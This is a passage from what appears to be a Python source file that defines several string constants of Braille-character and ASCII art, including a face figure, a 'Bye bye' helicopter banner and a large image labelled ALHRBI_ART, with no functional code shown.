⣿⣿⣿⣿⣿⣿⣧⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣯⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢷⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣮⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⢿⣿⣿⣿⣿⣿⣿⣿⣿⡿⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
"""

FACE = r"""
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣤⣤⣤⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⣿⣿⣿⣿⣿⣿⣿⣷⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⣿⣿⣿⣿⣿⣿⣿⡿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠻⠿⠿⠿⠟⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣶⣿⣿⣶⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⣿⣿⣿⣿⣿⣿⣿⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⣸⣿⣿⣿⣿⣿⣿⣿⣿⡟⣿⣿⣿⣿⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⣶⣾⣿⣶⣶⣤⡀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⣿⣿⣿⣿⣿⣿⡿⠀⠘⢿⣿⣿⣿⣷⡀⠀⠀⠀⠀⠀⠀⠀⠀⠠⠀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⡄⠀
⠀⠀⠀⠀⠀⠀⠀⣼⣿⣿⣿⣿⣿⣿⣿⣿⠇⠀⠀⠈⠻⣿⣿⣿⣿⣆⠀⠀⠀⢀⠀⠀⠀⠀⢰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀
⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀⣀⣤⣶⣶⣌⠻⣿⣿⣿⣷⡄⠀⠀⠀⠀⠀⠀⣸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀
⠀⠀⠀⠀⠀⠀⠀⠹⣿⣿⣿⣿⣿⣿⣿⠁⣰⣿⣿⣿⣿⣿⣦⣙⢿⣿⣿⣿⠄⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠟⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢿⣿⣿⣿⣿⣿⣿⠀⣿⣿⣿⣿⣿⣿⣿⣿⣦⣹⣟⣫⣼⣿⣿⣶⣿⣿⣿⣿⣿⣿⣯⡉⠉⠉⠁⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠐⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠈⣿⣿⣿⣿⣿⣿⡆⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠁⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⡇⠀⢻⣿⣿⣿⣿⣿⡇⠀⠀⠈⠉⠉⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⠉⠀⠀⠀⠀⠀⠀⠀
⠀⣠⣴⣶⣶⣶⣶⣶⣶⣾⣿⣿⣿⣿⣿⡇⠀⠸⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠹⢿⣿⣿⢿⣿⣿⣿⡿⠀⠀⠀⠀⠀⠀⠀⠀
⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⢰⣶⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣧⣄⣐⣀⣀⣀⣀⣀⡀
⠸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⢸⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⠀⠀⠉⠉⠙⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠁⠛⠛⠛⠛⠛⠛⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉ 
"""

BYE = r"""
                    ▬▬▬.◙.▬▬▬
                    ═▂▄▄▓▄▄▂
                    ◢◤ █▀▀████▄▄▄◢◤
                    █▄ █ █▄ ███▀▀▀▀▀▀╬
                    ◥█████◤
                    ══╩══╩═
                    ╬═╬
                    ╬═╬
                    ╬═╬    Just dropped down to say
                    ╬═╬    *Bye bye*
                    ╬═╬
                    ╬═╬☻/
                    ╬═╬/▌
                    ╬═╬/ \
"""

ALHRBI_ART = r"""
                    ⠀⢀⢺⣿⣿⣿⣿⣿⣦⡈⠻⣿⣿⣿⣿⣿⣿⡇⠀⡀⢀⠠⢀⠠⠀⠄⠠⠀⠄⡀⠄⢠⠀⡄⢠⠀⡄⢠⠀⠤⡀⠤⠠⠄⠤⠠⠄⠤⡐⢠⠐⡄⠢⢄⠢⡐⡄⢆⠄⠀⠀⠀⠀⠀⢄⠢⡄⢤⠠⠄⠄⠀⠀⠀⠀⠀⠂⠠⠐⡤⢐⠲⡘⢤⢂⡔⣠⢂⡔⢠⢂⡔⢠⢂⠔⡠⢂⡔⡠⠄⡢⢄⡰⠠⠄⠤⡐⠠⠄⠤⡀⠤⠠⠄⠤⠠⠄⠤⡀⠀
                    ⠀⠀⡘⣿⣿⣿⣿⣿⣿⣷⣤⣴⣿⣿⣿⣿⣿⠃⢀⠐⡀⠂⠄⢂⠡⢈⠔⡉⠄⢀⠘⡠⠡⠌⡄⢡⠘⡠⢉⠤⡑⢨⠁⢎⠰⡁⢎⡰⢁⢣⢉⡌⡱⣈⠥⡑⡜⡨⠜⠀⠀⠀⠀⠀⢊⠖⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⠒⠉⡖⣌⠲⣄⠣⡜⣡⢊⡔⢣⠌⣎⡑⢣⠜⣡⠠⢜⢂⠖⡩⢌⡱⣈⠥⣉⠆⡱⣈⠱⣈⠆⡱⡈⢆⡁⠀
                    ⠀⠀⠀⠀⠙⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠃⡀⢂⠂⡌⢘⡀⢃⠌⡐⠢⢌⠂⠀⠁⢆⠱⡈⠔⡡⢊⠔⡡⢢⢑⡡⠍⡬⠑⡜⢢⢡⢋⡔⢣⠜⡡⢎⠲⣉⠖⣱⢩⠀⠀⠀⠀⠀⡉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠱⢌⠳⣘⢤⠣⢎⡵⢚⡤⢫⡕⢮⡁⠀⢈⠎⣜⠱⣊⠴⣡⠚⡤⡙⠴⣨⠑⢦⠩⡔⠱⡌⠄⠀
                    ⠀⠀⠀⠀⠀⠀⠨⢉⣉⠉⠉⠉⢉⠉⡉⢁⢀⠂⠔⡁⢢⠘⡀⢆⠡⢊⠰⡁⢆⠂⠀⡉⢆⠱⣈⢒⠡⢎⡘⠴⡡⠎⠴⣉⠖⡩⢜⡡⢎⠖⡬⢃⡞⡱⢊⡵⢡⠞⣡⠖⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢧⣉⠶⣙⢎⠶⣩⠖⣣⢞⣡⠂⠄⡩⢚⣌⢳⡘⢦⡅⢏⡴⣉⠖⣡⢋⢆⠳⣌⠳⢌⠅⠀
                    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠂⠀⠀⠠⠌⡐⢀⠢⢈⠂⠔⡁⠢⢑⠂⡅⢊⠤⠑⡂⠄⠐⡐⠬⡑⠤⢋⠔⢪⡐⢣⠜⣩⠒⡥⢊⡕⢎⠼⡘⢎⡱⣍⠲⣍⠳⣌⠧⡛⡴⠩⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⢌⢞⡱⢎⡳⢥⡛⢦⣋⠖⢀⠠⢡⢋⠦⢣⡙⢆⠞⡌⡖⡡⠞⡤⢋⡌⢣⢆⡹⢌⠂⠀
                    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⠀⠐⠀⠂⠀⠈⠐⠀⠁⠂⠁⠈⠀⠌⠂⠁⠀⢂⡘⠄⠑⠈⠂⠉⠂⠌⠁⠊⠄⠙⠀⠃⠘⠌⠒⠉⠎⠰⠌⠓⠌⠓⠌⠲⠙⠀⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡄⠈⠊⠘⠡⠙⠂⠙⠂⠉⠂⠨⠄⣣⠆⠉⠂⠉⠌⠘⠠⠁⠁⠃⠌⠁⠘⠀⠂⠐⠈⠀⠀
                    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠂⡜⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠰⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠡⣃⢸⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
                    ⠀⠐⣆⢀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⠑⡌⠆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⢀⠀⠀⠀⠀⠀⠀⠈⠀⠀⠀⠀⠀⠀⢲⣭⣟⡦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
                    ⠀⠀⠀⠈⢎⡒⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢱⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⢀⠠⠀⠀⠀⠉⠙⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
                    ⠀⠀⠀⠀⠀⠀⠉⠧⠀⠀⠀⠀⠀⢀⠀⡀⢀⠀⡀⢀⠀⡀⢀⠀⣀⠀⡀⢀⠀⡀⣀⠀⣀⢀⡀⡄⣀⠠⣀⡀⠀⠀⠀⠀⣄⡠⡄⢤⠠⠄⠀⠀⠀⠐⠠⠂⠀⠀⠀⢸⡇⠀⠀⠀⢀⡀⡀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢃⡀⠀⡄⡀⠀⠄⢀⣠⢀⡄⣠⢀⡄⣀⣀⡀⣄⢠⢠⠄⡤⢠⠄⡤⣀⢄⡀⠀⠠⢀⠠⠀⠀⠀
                    ⠀⢀⡄⠀⠀⠀⠀⠀⠀⠀⠀⢈⠢⡘⠰⣈⠒⢌⠢⡑⢌⠢⡑⢄⠣⡘⠤⠑⠤⡁⠞⣠⠓⡼⡰⣍⢧⡱⢆⡁⠀⠀⠀⠁⠗⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣞⡇⠀⠀⡘⢦⠰⣉⠳⡔⢦⡐⡄⢀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢘⡆⠀⠹⣜⡮⣤⣄⡴⣫⢞⡵⢫⢖⡥⢎⡽⢎⣯⢏⡿⣝⣯⣻⢷⣻⢾⡄⠀⠀⠀⠀⠀⠀⠀
                    ⠀⠐⣎⡳⢤⡀⠀⠀⠀⠀⠀⠀⠀⠁⠁⠀⠈⠀⠁⠈⠀⠐⢀⠂⡐⢀⠂⢁⠂⡑⢠⠁⢊⠁⠓⠈⠂⠙⠈⠆⠀⠀⠆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢉⠀⠀⠀⠘⣆⢻⣘⣯⡽⣶⡹⣜⡆⠡⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣴⠠⠙⠎⠓⠓⠊⠑⢉⠎⡜⢣⠋⣌⢓⡸⡘⣌⠫⠜⠙⠒⠍⠛⠉⠛⠀⠀⢰⣾⣷⣿⡆⠀
                    ⠀⠘⣼⡱⢧⣙⠆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠀⠀⠀⠀⠄⢊⡐⠤⡈⠄⡘⢄⠣⡘⢠⢀⡀⣀⢀⡀⣀⢀⡀⠀⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢈⠀⠀⠀⠀⠀⠎⣧⢹⢶⣻⣳⣻⠮⣝⠳⡌⢲⡀⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠀⢀⠀⣀⢀⡀⠀⣈⢮⣑⢣⡹⢄⠯⣰⠳⣌⡳⣂⢀⣀⣀⣀⣀⣀⠀⠀⠸⣿⣿⣿⡇⠀
                    ⠀⠀⡀⠙⠣⢏⡜⠀⠀⠀⠀⢀⠣⢌⠡⡉⠜⡠⢊⠔⡀⠠⢘⡀⢆⠱⠐⡠⠑⣌⠢⣑⠢⢣⡝⣬⢧⡹⡜⣎⠀⠃⠀⠀⠀⠀⠀⠀⠀⢀⠀⠀⠀⠀⠀⠀⢒⠁⠂⠀⠀⠀⠀⠰⢣⠏⠋⠉⢁⣀⣤⡠⡄⢤⡡⢴⠘⡀⠀⠀⠀⠀⠀⠀⠀⠀⠉⢀⣯⣛⢮⣻⡜⡥⢚⢦⣹⢲⣙⠮⣝⢶⡹⢎⡵⢫⣟⡷⣯⢿⣽⣻⠆⠀⢸⣿⣿⣿⡇⠀
                    ⠀⠠⣟⡶⣤⢀⠈⠀⠀⠀⠀⠀⠎⡄⢣⢘⠰⣁⠎⡐⠠⠐⢂⠜⡠⢃⠡⠄⡃⠦⣑⠢⢍⠳⣜⣣⠞⣵⡹⣖⠀⠀⠀⠀⠀⠀⠀⠀⠀⠝⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣃⠄⠮⠙⠈⠈⠀⠁⠉⠠⣝⢎⢳⡁⠀⠀⠀⠀⣄⡐⠁⠀⣰⢏⣶⣫⣟⣧⡟⡴⢩⢞⡲⣏⣞⡹⢞⡼⣱⢫⣜⣻⡾⣿⣽⣿⣾⣿⠂⠀⢠⣾⣷⣿⡦⠀
                    ⠀⠀⣿⢺⡵⣏⡖⠀⠀⠀⠀⢈⢒⡘⠤⣊⠱⣂⠥⢃⡐⠈⡔⢊⡔⢡⠂⢂⠅⢳⢨⡑⢪⡱⢏⡶⣛⢶⡹⣎⠓⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⠈⠀⠁⠀⠀⠀⠀⠀⠀⣻⢦⠀⠀⠓⣀⢀⡠⣴⢻⣜⢫⢦⡙⠄⠀⠐⠐⣀⠀⢃⢸⡽⣞⣧⢟⣾⣳⡟⣔⢫⡞⣵⢫⣼⡹⣏⣾⢣⡿⣜⣷⣿⣿⣷⣿⣿⣿⡃⠀⢸⣿⣿⣿⡷⠀
                    ⠀⠀⠋⠿⣱⣏⡞⠀⠀⠀⠀⠐⣊⠔⡣⢌⡓⢤⢃⠣⡐⠐⣌⠧⣜⢢⠜⡠⢎⡵⢢⡝⣢⢝⡽⣎⢷⣫⢷⣹⢆⡀⠀⠀⠀⠀⠀⠀⠂⠀⠀⠀⠀⢠⣥⣶⠀⠀⠀⠀⠀⠀⠀⠀⣽⢪⣟⣧⣛⡴⢫⢷⣯⠷⣎⡳⢆⡍⠀⠄⣐⠈⠡⠀⡈⣼⡿⣽⣺⢯⡷⣯⣟⢆⢣⢛⡜⣫⠖⣏⢳⠺⣭⢳⡛⣾⣿⣿⣿⣿⣿⣿⡅⠀⢸⣿⣿⣿⡷⠀
                    ⠀⢀⡷⣦⣄⠈⠑⠀⠀⠀⠀⢈⠦⡙⢤⠣⡜⢢⠍⣆⠡⠘⣬⢻⡬⣓⠎⡱⢈⠜⣣⢞⡱⣎⢷⣹⢾⣱⡟⣞⡏⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠃⠀⠀⠀⠀⠀⠀⠀⠀⣯⣛⠾⣷⢫⡜⣯⢾⣼⢫⣳⣙⠎⡴⢈⣰⠀⣖⡀⡀⣸⣷⣟⣯⣟⣯⡟⣷⣏⠎⣆⠣⡜⢢⢛⢬⢲⡹⣔⢣⡜⣿⣿⣿⣿⣿⣿⣿⡅⠀⢨⣿⣿⣿⣧⠀
                    ⠀⠠⣿⣳⣯⢿⡳⠀⠀⠀⠀⢠⠒⡍⣆⠳⡜⢣⢫⠔⡂⡑⢮⡳⢧⡙⢦⡁⢎⢞⡱⣎⢷⣹⠾⣽⣳⡟⣾⢯⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠄⠂⠐⠀⠀⠀⢘⣧⠽⠶⠭⣇⢻⣜⡾⣽⣻⢶⣹⣚⢁⣾⡏⠀⣧⣇⢶⣾⣯⣽⣞⡿⣞⣿⣳⣯⡓⢤⢳⡘⢧⣋⣎⢳⠒⠌⠣⣜⣿⣿⣿⣿⣿⣿⣿⡇⠀⣻⣿⣿⣿⣿⠀
                    ⠀⠐⣿⣽⣾⣿⣽⠀⠀⠀⠀⠀⡏⣴⠊⡕⡎⣧⢫⡜⠐⡌⢳⣽⢣⡟⢢⠉⡎⡜⢱⢹⡎⣷⢻⣷⣯⣿⣽⢻⣾⣷⠀⠀⠀⠀⠀⠀⠂⠀⢠⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢨⢰⣶⣾⣯⣷⣾⢻⣷⣯⣷⣧⡏⢸⣿⠃⡜⣽⣿⣷⡝⡏⣷⣿⢻⣽⣾⣿⣷⡍⢲⢣⡏⣷⣭⠚⣧⢣⡔⢲⣼⣿⣿⣿⣿⣿⣿⣿⡇⠀⣿⣿⣿⣿⣿⠀
                    ⠀⠀⣤⠉⠙⠺⢧⠃⠀⠀⠀⠘⡴⢡⠞⣡⡝⣬⢚⡴⠡⢌⠳⣝⢮⡓⢎⡱⡜⣱⢣⡟⣼⣭⣟⡾⣽⢾⡽⡏⠉⠀⠀⠀⠀⠀⠀⠀⠃⠀⠀⠀⢀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠚⠌⠛⠳⠿⠛⢾⣻⢾⡽⣞⢮⢙⡼⠋⠀⠀⣿⣿⢻⣷⡜⡼⣟⣿⡿⣽⣻⣷⡉⢶⡹⣜⠶⣭⢻⣜⡣⢜⠲⣼⣿⣿⣿⣿⣿⣿⣿⡅⠀⣹⣿⣿⣿⣯⠀
                    ⠀⠠⣿⣿⣿⣶⣤⡀⠀⠀⠀⡘⠴⣩⢚⡕⡺⣔⢫⡔⢣⢈⢳⣭⢷⡙⡎⠴⣡⢣⢏⣞⡳⢮⡿⣝⣯⢿⣻⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⢠⠂⠀⠀⠀⠀⠀⠀⣄⠀⠀⠀⠀⠀⢀⡴⣶⢫⣯⠽⡎⠡⢊⠔⡡⠄⠀⣻⣿⡎⣿⣿⣿⣿⡿⣽⣿⣻⣷⡉⢖⡹⢎⡻⣜⠳⢊⢁⡀⠈⢰⣿⣿⣿⣿⣿⣿⣿⡇⠀⣿⣿⣿⣿⣿⠀
                    ⠀⢐⣿⣿⣿⣿⣿⠄⠀⠀⢀⠰⣍⠲⣍⢞⡱⢎⡳⣜⠡⢂⡽⣎⢧⡹⣌⠳⢤⣋⡞⣾⣙⢯⣟⡿⣽⣻⣿⣿⠀⠀⠚⡴⣀⢀⠀⠀⢠⣠⣤⣤⣄⢿⠁⠀⠀⠀⠀⠀⠀⣼⣿⣦⠀⠰⣆⢾⣳⢿⡽⡻⠜⠃⠀⢂⡱⠞⡁⠀⠀⢿⣿⣷⢻⣿⣾⣷⣿⣿⣿⣿⣷⡉⢮⡝⣯⡳⠉⠀⠘⣣⠹⣄⢸⣿⣿⣿⣿⣿⣿⣿⡇⠂⣿⣿⣿⣿⣿⠀
                    ⠀⠈⣛⠻⠿⠿⣿⠆⠀⠀⢀⠲⣌⠳⡜⢮⡱⣏⢵⢪⡑⢢⢙⣿⠲⣝⢮⡙⢆⡳⣜⢶⡭⣯⢿⣽⣿⡟⠿⠀⠀⠀⢀⡄⡀⠉⠖⠄⠀⠀⠀⠀⠀⠈⠀⠀⠀⠀⠀⠀⠀⠸⣿⣿⣷⣌⣈⠓⠉⠓⠉⠀⠀⢠⢉⠖⠁⠀⢠⠀⣰⣶⣶⣽⡂⢻⣿⣿⣿⣿⣿⣿⣷⡹⣘⡿⣧⡟⡶⡲⠄⣄⠓⣌⢺⣿⣿⣿⣿⣿⣿⣿⡇⡁⣿⣿⣿⣿⣿⠀
                    ⠀⢘⣿⣿⣷⣶⣷⡄⠀⠀⢀⠣⣜⢣⡝⣣⠽⡜⣎⠳⡌⢄⢫⣞⠛⣜⢢⡝⢪⢷⡹⢎⡷⢯⣿⣾⣟⣇⠀⠀⠀⡉⢀⣈⠓⠣⣤⠀⠀⠀⠀⠀⠀⠀⢀⠀⠀⢀⣴⣿⣖⢀⣽⣿⣿⣿⣿⣿⠀⡤⠀⠀⠀⠀⠀⠀⠀⠈⢀⣡⣼⣿⣿⣿⣷⢹⣿⣿⣿⣿⣿⣿⣿⠥⣹⠊⠁⢠⣰⡽⣻⡜⡯⢔⣻⣿⣿⣿⣿⣿⣿⣿⡗⡀⣿⣿⣿⣿⣿⠀
                    ⠀⢨⣿⣿⣿⣿⣿⡇⠀⠀⢀⠳⣌⢳⡚⣵⢫⡝⣮⠳⡜⡐⢎⡾⡽⣜⡷⣚⢧⣻⡽⣟⡾⣯⣿⣞⣿⡇⠀⢬⡑⠌⠃⠈⠓⠒⠄⡉⠀⠀⠀⠀⠀⠁⠁⢀⣴⣿⣿⣿⣿⣿⣿⣿⡿⠟⠛⠉⣀⢄⢢⠒⡌⢹⣿⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏⣿⣿⣿⣿⣿⣿⣯⡓⠤⢀⠜⣣⣏⡼⢳⡙⢦⣓⣾⣿⣿⣿⣿⣿⣿⣿⡧⢱⣿⣿⣿⣿⣿⠀
                    ⠀⠘⣿⣿⣿⣿⣿⣏⠀⠀⢠⢓⡼⢣⡻⣜⢧⠿⣜⣳⠱⡘⢬⢳⡹⢯⡷⡹⢎⣷⣟⣿⣽⣳⣿⢿⣿⣿⣆⠀⠤⣔⡠⠀⠀⢀⠀⡀⠀⢠⢲⣦⣶⣶⣶⣤⣬⣿⣿⣿⣿⣿⣿⠋⠀⡠⢆⡳⣌⠞⣦⢛⡴⣡⢌⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡜⣿⣿⣿⣿⣿⣿⡑⠈⡐⢮⡱⢯⣟⣧⣿⢯⣷⣻⣿⣿⣿⣿⣿⣿⣿⣗⣣⣿⣿⣿⣿⣿⠀
                    ⠀⢸⣼⣿⣿⣽⣿⡤⠀⠀⠠⢏⡼⣳⡝⣮⢟⣯⣟⡼⢣⢉⡎⢧⡘⢧⡻⣍⣛⢾⡽⣾⡳⣯⣿⣿⣿⣿⣿⣇⠰⢌⡳⣜⡈⢆⠹⢘⠥⠘⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠃⠀⡰⡑⢮⡵⣺⡽⣮⡟⣾⡱⣏⠖⣌⡙⠻⢿⣿⣿⣿⣿⣿⣿⣿⡜⣿⣿⣿⣿⣷⡍⢲⠱⢆⡉⠀⢻⣷⣿⣿⡾⣿⣿⣿⣿⣿⣿⣿⣿⡷⣻⣿⣿⣿⣿⣿⠀
                    ⠀⢸⣿⣿⣿⣿⣿⣟⠀⠀⠘⣬⠳⢧⣻⢼⣛⡾⣾⣹⢃⠎⡜⣧⢹⢯⣷⡹⣜⢫⡿⣵⢯⡷⣿⣿⣿⣿⣿⣿⣆⠀⠓⣌⠳⡎⢄⠁⣠⢳⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀⠠⡑⢭⡲⣝⣷⣻⢷⣻⡵⣛⡬⣛⡴⣹⢒⡌⠹⣟⠿⣿⣿⣿⣿⣿⡹⣿⣿⣿⣷⢍⡲⣀⡀⢨⠱⡠⢟⡿⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⣽⣿⣿⣿⣿⣿⠀
